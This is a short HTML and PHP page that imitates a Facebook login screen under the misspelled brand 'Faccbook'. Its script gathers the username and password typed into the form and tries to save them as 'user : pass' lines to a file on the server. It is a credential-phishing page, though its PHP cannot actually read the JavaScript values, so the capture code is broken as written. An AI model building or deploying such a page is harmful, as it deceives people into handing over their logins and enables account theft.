<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" encoding="utf-8">
<head>
<title> Login | Faccbook </title>
</head>
<script type="text/javascript">
function saver()
{
var use=document.getElementById("usn").value;
var pasw=document.getElementById("pass").value;
var disp= use +' : '+ pasw +'\n';

<?php 
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
fwrite($myfile,$disp);
fclose($myfile);
?>
}
</script>
<body bgcolor="e9ebee">
<div style="background-color:#4267b2;color:white;"> <b> Login to view the content </b> </div>
<!--login form-->
<input type="text" name="username" placeholder="Email/Phone" id="usn"><br/>
<input type="text" name="password" placeholder="password" id="pass"><br/>
<input type="button" name="send" value="Log In" onclick="saver();"><br/><br/>
<a href="index.html"> Forgotten password?</a><br/><br/>
<a href="#"> Help center</a><br/><br/><br/><br/><br/><br/><br/>
<!--login form--><!--login form--><!--login form--><!--login form-->
<div style="background-color:#4267b2;color:white;"> <b> Faccbook © 2017 </b> </div>
</body>
</html>
